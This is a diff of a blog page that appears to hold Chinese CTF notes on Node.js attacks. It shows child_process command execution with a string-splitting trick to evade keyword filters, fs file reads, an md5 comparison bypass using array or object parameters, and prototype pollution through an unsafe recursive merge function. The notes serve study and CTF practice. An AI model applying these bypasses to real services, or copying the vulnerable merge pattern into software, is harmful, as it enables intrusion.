@@ -32,55 +32,140 @@
 <meta property="og:title" content="NodeJs" />
 <meta property="og:description" content="命令执行 link
 
-    
-    require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
 require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
 require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
 //绕过简单的限制
 require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()
+  
+  
 不用child_process读取文件
 
 
-    
-    __filename //获取当前文件的绝对路径
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  __filename //获取当前文件的绝对路径
 __dirname //获取当前文件解析过后的文件夹的绝对路径
 require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
 require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件
-
+  
+  
 md5 link
 
-    
-    if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
+  
+  
 
 传入a[]=1&amp;b[]=2
 得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
 而nodejs中数组和字符串的拼接如下：
 
 
-    
-    console.log(5&#43;[6,6]); //56,6
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  console.log(5&#43;[6,6]); //56,6
 console.log(&#34;5&#34;&#43;6); //56
 console.log(&#34;5&#34;&#43;[6,6]); //56,6
 console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6
-
+  
+  
 
 则[&lsquo;a&rsquo;]&#43;flag== &lsquo;a&rsquo;&#43;flag
 如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:&#39;1&#39;}
 
 
-    
-    let a={
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  let a={
     x:&#39;1&#39;
 }
 console.log(a&#43;&#34;flag{123}&#34;)
 //返回的是： [object Object]flag{123}
-
+  
+  
 
 所以传入a[x]=1&amp;b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。
 原型链污染 link
 
-    
-    //定义一个类
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  //定义一个类
 function Foo() {
     this.bar = 1
 }
@@ -113,6 +198,8 @@ foo.show() //输出1
 //foo对象天生就有show方法
 //通过proto属性可以访问类的原型，即：
 foo.__proto__==Foo.prototype
+  
+  
 
 总结：
 prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法" />
@@ -124,55 +211,140 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
 <meta name="twitter:title" content="NodeJs"/>
 <meta name="twitter:description" content="命令执行 link
 
-    
-    require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
 require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
 require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
 //绕过简单的限制
 require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()
+  
+  
 不用child_process读取文件
 
 
-    
-    __filename //获取当前文件的绝对路径
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  __filename //获取当前文件的绝对路径
 __dirname //获取当前文件解析过后的文件夹的绝对路径
 require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
 require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件
-
+  
+  
 md5 link
 
-    
-    if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))
+  
+  
 
 传入a[]=1&amp;b[]=2
 得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
 而nodejs中数组和字符串的拼接如下：
 
 
-    
-    console.log(5&#43;[6,6]); //56,6
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  console.log(5&#43;[6,6]); //56,6
 console.log(&#34;5&#34;&#43;6); //56
 console.log(&#34;5&#34;&#43;[6,6]); //56,6
 console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6
-
+  
+  
 
 则[&lsquo;a&rsquo;]&#43;flag== &lsquo;a&rsquo;&#43;flag
 如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:&#39;1&#39;}
 
 
-    
-    let a={
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  let a={
     x:&#39;1&#39;
 }
 console.log(a&#43;&#34;flag{123}&#34;)
 //返回的是： [object Object]flag{123}
-
+  
+  
 
 所以传入a[x]=1&amp;b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。
 原型链污染 link
 
-    
-    //定义一个类
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  //定义一个类
 function Foo() {
     this.bar = 1
 }
@@ -205,6 +377,8 @@ foo.show() //输出1
 //foo对象天生就有show方法
 //通过proto属性可以访问类的原型，即：
 foo.__proto__==Foo.prototype
+  
+  
 
 总结：
 prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法"/>
@@ -554,133 +728,248 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
     <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
         <h1 id="命令执行">命令执行 <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#39;ls&#39;</span>); <span style="color:#75715e">//返回值是child_process，不能转字符串
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">toString</span>(); <span style="color:#75715e">//返回值是字符串
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">toString</span>();<span style="color:#75715e">// 返回object，toString转成字符串
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//绕过简单的限制
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>)[<span style="color:#e6db74">&#39;exe&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;cSync&#39;</span>](<span style="color:#e6db74">&#39;ls&#39;</span>).<span style="color:#a6e22e">toString</span>()</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="298affe" class="language-js ">
+  <code>require(&#39;child_process&#39;).exec(&#39;ls&#39;); //返回值是child_process，不能转字符串
+require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString(); //返回值是字符串
+require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString();// 返回object，toString转成字符串
+//绕过简单的限制
+require(&#39;child_process&#39;)[&#39;exe&#39;&#43;&#39;cSync&#39;](&#39;ls&#39;).toString()</code>
+  </pre>
+  </div>
 <p>不用<code>child_process</code>读取文件</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">__filename</span> <span style="color:#75715e">//获取当前文件的绝对路径
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">__dirname</span> <span style="color:#75715e">//获取当前文件解析过后的文件夹的绝对路径
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readFileSync</span>(<span style="color:#a6e22e">__filename</span>,<span style="color:#e6db74">&#39;utf-8&#39;</span>); <span style="color:#75715e">//读取当前文件
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readdirSync</span>(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#75715e">//读取当前目录下所有文件
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="b75ef0f" class="language-js ">
+  <code>__filename //获取当前文件的绝对路径
+__dirname //获取当前文件解析过后的文件夹的绝对路径
+require(&#39;fs&#39;).readFileSync(__filename,&#39;utf-8&#39;); //读取当前文件
+require(&#39;fs&#39;).readdirSync(&#39;.&#39;) //读取当前目录下所有文件</code>
+  </pre>
+  </div>
 <h1 id="md5">md5 <a href="#md5" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">===</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">!==</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>)<span style="color:#f92672">===</span><span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">b</span><span style="color:#f92672">+</span><span style="color:#a6e22e">flag</span>))</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="6111101" class="language-js ">
+  <code>if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a&#43;flag)===md5(b&#43;flag))</code>
+  </pre>
+  </div>
 <blockquote>
 <p>传入a[]=1&amp;b[]=2
 得到的是[&lsquo;1&rsquo;]和[&lsquo;2&rsquo;]
 而nodejs中数组和字符串的拼接如下：</p></blockquote>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,6
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>); <span style="color:#75715e">//56
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">6</span>]); <span style="color:#75715e">//56,6
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span>[<span style="color:#e6db74">&#34;6&#34;</span>,<span style="color:#e6db74">&#34;6&#34;</span>]); <span style="color:#75715e">//56,6
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="a825148" class="language-js ">
+  <code>console.log(5&#43;[6,6]); //56,6
+console.log(&#34;5&#34;&#43;6); //56
+console.log(&#34;5&#34;&#43;[6,6]); //56,6
+console.log(&#34;5&#34;&#43;[&#34;6&#34;,&#34;6&#34;]); //56,6</code>
+  </pre>
+  </div>
 <blockquote>
 <p>则[&lsquo;a&rsquo;]+flag== &lsquo;a&rsquo;+flag</p></blockquote>
 <p>如果传入的是非数字索引，比如<code>[x]=1</code>，那么就会变为js的对象<code>{x:'1'}</code></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">x</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;1&#39;</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;flag{123}&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//返回的是： [object Object]flag{123}
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="0138822" class="language-js ">
+  <code>let a={
+    x:&#39;1&#39;
+}
+console.log(a&#43;&#34;flag{123}&#34;)
+//返回的是： [object Object]flag{123}</code>
+  </pre>
+  </div>
 <blockquote>
 <p>所以传入a[x]=1&amp;b[x]=1也能绕过，此时<code>a!==b</code>比较的是内存地址，而不是键值。</p></blockquote>
 <h1 id="原型链污染">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1>
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">//定义一个类
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//类内的方法
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">show</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span><span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()).<span style="color:#a6e22e">show</span>() <span style="color:#75715e">//输出1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//使用原型prototype创建类时，就会只创建一次show方法。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Foo</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Foo</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">show</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">bar</span>)
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Foo</span>()
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">show</span>() <span style="color:#75715e">//输出1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//foo对象天生就有show方法
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//通过proto属性可以访问类的原型，即：
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">__proto__</span><span style="color:#f92672">==</span><span style="color:#a6e22e">Foo</span>.<span style="color:#a6e22e">prototype</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7faf206" class="language-js ">
+  <code>//定义一个类
+function Foo() {
+    this.bar = 1
+}
+
+new Foo()
+
+//类内的方法
+function Foo() {
+    this.bar = 1
+    this.show = function() {
+        console.log(this.bar)
+        this.bar=this.bar&#43;1
+    }
+}
+
+(new Foo()).show() //输出1
+//但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上
+//使用原型prototype创建类时，就会只创建一次show方法。
+function Foo() {
+    this.bar = 1
+}
+
+Foo.prototype.show = function show() {
+    console.log(this.bar)
+}
+
+let foo = new Foo()
+foo.show() //输出1
+//原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。
+//foo对象天生就有show方法
+//通过proto属性可以访问类的原型，即：
+foo.__proto__==Foo.prototype</code>
+  </pre>
+  </div>
 <blockquote>
 <p>总结：
 <code>prototype</code>是一个类的属性，所有类对象实例化时都会有<code>prototype</code>中的属性和方法</p></blockquote>
 <h1 id="js中的继承">js中的继承 <a href="#js%e4%b8%ad%e7%9a%84%e7%bb%a7%e6%89%bf" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><p>js中的继承使用的便是<code>prototype</code></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Father</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">first_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Donald&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">last_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Trump&#39;</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Son</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">first_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Melania&#39;</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Son</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Father</span>()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">son</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Son</span>()
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Name: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">son</span>.<span style="color:#a6e22e">first_name</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">son</span>.<span style="color:#a6e22e">last_name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//输出：Name: Melania Trump
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="d31e4fb" class="language-js ">
+  <code>function Father() {
+    this.first_name = &#39;Donald&#39;
+    this.last_name = &#39;Trump&#39;
+}
+
+function Son() {
+    this.first_name = &#39;Melania&#39;
+}
+
+Son.prototype = new Father()
+
+let son = new Son()
+console.log(`Name: ${son.first_name} ${son.last_name}`)
+//输出：Name: Melania Trump
+//此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null</code>
+  </pre>
+  </div>
 <h1 id="原型链污染-1">原型链污染 <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-1" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h1><h2 id="原理">原理 <a href="#%e5%8e%9f%e7%90%86" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>可以访问原型，也可以修改原型的值</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">bar</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// foo.bar 此时为1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">bar</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 修改foo的原型（即Object）
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">__proto__</span>.<span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 由于查找顺序的原因，foo.bar仍然是1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foo</span>.<span style="color:#a6e22e">bar</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 此时再用Object创建一个空的zoo对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">zoo</span> <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 查看zoo.bar
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">zoo</span>.<span style="color:#a6e22e">bar</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//尽管zoo为空对象，依然输出了1 1 2
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="13db417" class="language-js ">
+  <code>let foo = {bar: 1}
+
+// foo.bar 此时为1
+console.log(foo.bar)
+
+// 修改foo的原型（即Object）
+foo.__proto__.bar = 2
+
+// 由于查找顺序的原因，foo.bar仍然是1
+console.log(foo.bar)
+
+// 此时再用Object创建一个空的zoo对象
+let zoo = {}
+
+// 查看zoo.bar
+console.log(zoo.bar)
+//尽管zoo为空对象，依然输出了1 1 2
+//foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性</code>
+  </pre>
+  </div>
 <h2 id="使用场景">使用场景 <a href="#%e4%bd%bf%e7%94%a8%e5%9c%ba%e6%99%af" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>找到能控制的数组（对象）的键名的操作即可</p>
 <ul>
 <li>对象merge</li>
@@ -688,206 +977,414 @@ prototype是一个类的属性，所有类对象实例化时都会有prototype�
 </ul>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">target</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>])
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="b784108" class="language-js ">
+  <code>function merge(target, source) {
+    for (let key in source) {
+        if (key in source &amp;&amp; key in target) {
+            merge(target[key], source[key])
+        } else {
+            target[key] = source[key]
+        }
+    }
+}</code>
